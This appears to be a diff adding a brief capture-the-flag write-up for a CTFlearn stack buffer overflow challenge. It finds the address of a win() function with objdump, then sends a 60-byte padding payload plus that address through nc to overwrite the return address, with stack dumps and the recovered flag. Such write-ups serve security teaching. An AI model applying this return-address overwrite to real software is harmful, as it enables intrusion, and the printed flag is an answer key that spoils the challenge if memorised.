@@ -1,0 +1,48 @@
+1. $ objdump server -D > server.s
+
+void win() {
+  system("/bin/cat /flag.txt");
+}
+
+08048586 <win>:
+ 8048586:       55                      push   %ebp
+ 8048587:       89 e5                   mov    %esp,%ebp
+ 8048589:       53                      push   %ebx
+ 804858a:       83 ec 04                sub    $0x4,%esp
+ 804858d:       e8 08 01 00 00          call   804869a <__x86.get_pc_thunk.ax>
+
+The address of win() 0x08048586
+
+2. Let's pwn it
+
+jnasd@jnasd-VirtualBox:~/ctflearn/binary/easy$  python -c "print ('a' * 60 + '\x86\x85\x04\x08')" | nc thekidofarcrania.com 4902
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xffe34210 | 00 00 00 00 00 00 00 00 |
+0xffe34218 | 00 00 00 00 00 00 00 00 |
+0xffe34220 | 00 00 00 00 00 00 00 00 |
+0xffe34228 | 00 00 00 00 00 00 00 00 |
+0xffe34230 | ff ff ff ff ff ff ff ff |
+0xffe34238 | ff ff ff ff ff ff ff ff |
+0xffe34240 | c0 f5 7a f7 00 a0 04 08 |
+0xffe34248 | 58 42 e3 ff 8b 86 04 08 |
+Return address: 0x0804868b
+
+Input some text: 
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xffe34210 | 61 61 61 61 61 61 61 61 |
+0xffe34218 | 61 61 61 61 61 61 61 61 |
+0xffe34220 | 61 61 61 61 61 61 61 61 |
+0xffe34228 | 61 61 61 61 61 61 61 61 |
+0xffe34230 | 61 61 61 61 61 61 61 61 |
+0xffe34238 | 61 61 61 61 61 61 61 61 |
+0xffe34240 | 61 61 61 61 61 61 61 61 |
+0xffe34248 | 61 61 61 61 86 85 04 08 |
+Return address: 0x08048586
+
+CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
+timeout: the monitored command dumped core
